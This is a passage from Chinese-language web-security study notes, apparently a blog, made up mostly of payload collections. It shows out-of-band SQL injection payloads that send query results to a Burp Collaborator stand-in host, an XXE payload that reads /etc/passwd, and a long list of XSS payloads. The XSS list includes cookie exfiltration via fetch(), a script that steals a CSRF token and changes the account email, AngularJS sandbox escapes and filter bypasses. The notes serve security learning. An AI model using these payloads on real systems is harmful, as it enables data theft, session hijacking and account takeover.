YOUR-QUERY-HERE)||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            FROM dual&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft: declare @p varchar (1024);set @p=(SELECT YOUR-QUERY-HERE);exec (&amp;#x27;master..xp_dirtree &amp;quot;//&amp;#x27;+@p+&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL: create OR replace function f () returns void as $$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare c text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare p text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   begin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT into p (SELECT YOUR-QUERY-HERE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   c := &amp;#x27;copy (SELECT &amp;#x27;&amp;#x27;&amp;#x27;&amp;#x27;) to program &amp;#x27;&amp;#x27;nslookup &amp;#x27;||p||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   execute c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   END;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   $$ language plpgsql security definer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT f ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL: SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（仅在 windows 有用）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以用简单的 +,- 来判断某些数字参数是否会被后台执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当返回只能有一列而结果有多列时，可以考虑以下方法将多列拼成一列。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT username || &amp;#x27;~&amp;#x27; || password FROM users&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;一段简单的 XML payload，用来展示 xml 格式。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE xxe [ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ELEMENT name ANY &amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:/etc/passwd&amp;quot; &amp;gt;]&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h3&gt;
&lt;p&gt;0.payload 汇总。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;1&amp;quot; onerror=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert (document.cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;onmouseover=&amp;quot;alert (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;-alert (1)-&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$on.constructor (&amp;#x27;alert (1)&amp;#x27;)()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch (&amp;#x27;https://BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method: &amp;#x27;POST&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mode: &amp;#x27;no-cors&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body:document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var req = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.onload = handleResponse;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.open (&amp;#x27;get&amp;#x27;,&amp;#x27;/my-account&amp;#x27;,true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.send ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function handleResponse () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var token = this.responseText.match (/name=&amp;quot;csrf&amp;quot; value=&amp;quot;(\w+)&amp;quot;/)[1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var changeReq = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.open (&amp;#x27;post&amp;#x27;, &amp;#x27;/my-account/change-email&amp;#x27;, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.send (&amp;#x27;csrf=&amp;#x27;+token+&amp;#x27;&amp;amp;email=test@test.com&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;xss id=x onfocus=alert (document.cookie) tabindex=1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;animatetransform onbegin=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accesskey=&amp;#x27;x&amp;#x27;onclick=&amp;#x27;alert (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 以下带绕过功能 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert (1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;\&amp;#x27;-alert (1)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://foo?&amp;amp;apos;-alert (1)-&amp;amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;alert (1)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;a&amp;gt;&amp;lt;animate attributeName=href values=javascript:alert (1)/&amp;gt;&amp;lt;text x=20 y=20&amp;gt;Click me&amp;lt;/text&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=x=&amp;gt;&amp;#123;throw/**/onerror=alert,1337&amp;#125;,toString=x,window+&amp;#x27;&amp;#x27;,&amp;#123;x:&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（AngularJS）：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;toString ().constructor.prototype.charAt=[].join;[1]|orderBy:toString ().constructor.fromCharCode (120,61,97,108,101,114,116,40,49,41)=1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input autofocus ng-focus=&amp;quot;$event.path|orderBy:&amp;#x27;[].constructor.from ([1],alert)&amp;#x27;&amp;quot;&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1].map (alert)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input id=x ng-focus=$event.path|orderBy:&amp;#x27;(z=alert)(document.cookie)&amp;#x27;&amp;gt;#x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;img src=&amp;#x27;//attacker-website.com?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (window.name) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	new Image ().src=&amp;#x27;subdomain//?&amp;#x27;+encodeURIComponent (window.name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		location = &amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert (1)&amp;lt;/script&amp;gt;&amp;amp;token=;script-src-elem &amp;#x27;unsafe-inline&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用以下代码，对使用了 innerHTML 的网页实现 DOM XSS 攻击，innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;1&amp;quot; onerror=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一段 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网页的代码可能会从 url 中获取参数，url 中的参数不一定都是传给后端的，通过修改这些参数可能触发 XSS。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert (document.cookie)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;4.DOM 型的 XSS，目前来看是通过在 html 中添加 img 或者 svg 等元素，然后通过触发其中的 onerror 等属性来运行自己的 payload。&lt;br /&gt;
5. 为什么使用 HTML 编码能预防 XSS 攻击。&lt;br /&gt;
HTML 在解析时存在多种状态，在这个问题中需要了解 &amp;quot;Tag open state&amp;quot;, &amp;quot;Tag name state&amp;quot; 和 &amp;quot;Data state&amp;quot;,HTML 初始为 &amp;quot;Data state&amp;quot;, 在遇到第一个 &amp;lt; 后进入 &amp;quot;Tag open state&amp;quot;, 之后在遇到第一个字符时&lt;br /&gt;
进入 &amp;quot;Tag name state&amp;quot;，直到遇到 &amp;gt; 结束。当我们的 XSS 代码（比如 &amp;lt;script&amp;gt;alert ()&amp;lt;/script&amp;gt;）被 HTML 编码后，HTML 遇到被编码后的 &amp;lt;，不会进入 &amp;quot;Tag open state&amp;quot;，而是会保持 &amp;quot;Data state&amp;quot; 并对其解码，因此 &amp;lt; script &amp;gt; 标签不会发挥作用。&lt;br /&gt;
6. 使用以下代码绕过 html 编码保护， 仅在 DOM 中有用：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;onmouseover=&amp;quot;alert (1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
7. 一种新的 payload, 用于封闭 script 中变量的 &#39;&#39;。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;-alert (1)-&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
8. 有的变量里面也可以变成 payload，比如 a=b，但是如果只是修改 b 不能造成 xss，因为编译器只会将 payload 赋给 a，需要用一些符号让 payload 执行才行。之前的 sql 注入也有这种问题。&lt;br /&gt;
9.window.location 对象所包含的属性。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash: 从井号开始的 URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;host: 主机名和当前 URL 的端口号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hostname: 当前 URL 的主机名 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;href: 完整的 URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pathname: 当前 URL 的路径部分 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;port: 当前 URL 的端口号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;protocol: 当前 URL 的协议 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search: 从问号开始的 URL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
10. 一种新的 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$on.constructor (&amp;#x27;alert (1)&amp;#x27;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;11.AngularJS 是一个 js 框架，当有 ng-app 属性的 html 元素的内容被更改是，会执行 {分隔符 {分隔符} 分隔符} 的内容（分隔符当不存在，不加这个 hexo 报错）。&lt;br /&gt;
12.js 文件中存在变量赋值的地方需要注意，可以通过修改变量赋值，让其变成包含指令的运算，从而达到执行指令的目的。&lt;/p&gt;
&lt;ol start=&#34;13&#34;&gt;
&lt;li&gt;
&lt;p&gt;用于获取 cookie 的 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch (&amp;#x27;https://BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method: &amp;#x27;POST&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mode: &amp;#x27;no-cors&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body:document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用在 CSRF 中学到的基础绕过，依旧没有绕过 token，使用以下 XSS 的 payload 可以获取用户的 token。&lt;br /&gt;
